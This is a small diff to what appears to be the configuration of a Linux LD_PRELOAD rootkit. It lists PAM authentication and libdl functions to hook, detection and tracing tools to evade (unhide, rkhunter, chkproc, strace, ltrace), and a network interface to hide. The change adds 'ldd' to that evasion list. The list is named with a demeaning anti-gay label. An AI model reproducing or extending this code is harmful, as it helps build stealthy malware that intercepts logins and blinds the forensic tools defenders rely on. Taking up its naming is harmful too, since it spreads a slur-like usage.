@@ -115,7 +115,7 @@ LIBDL_CALLS = ["dladdr", "dlinfo", "dlsym"] # we also hook libdl stuff in order 
 LIBPAM_CALLS = ["pam_authenticate", "pam_open_session", "pam_acct_mgmt"] # and the same here...
 
 # GAY_PROCS is a bit of a misnaming. this can also include environment variables :)
-GAY_PROCS = ["unhide", "rkhunter", "chkproc", "ltrace", "strace", "LD_AUDIT"]
+GAY_PROCS = ["ldd", "unhide", "rkhunter", "chkproc", "ltrace", "strace", "LD_AUDIT"]
 
 HIDDEN_INTERFACES = ["lxcbr0"]
 
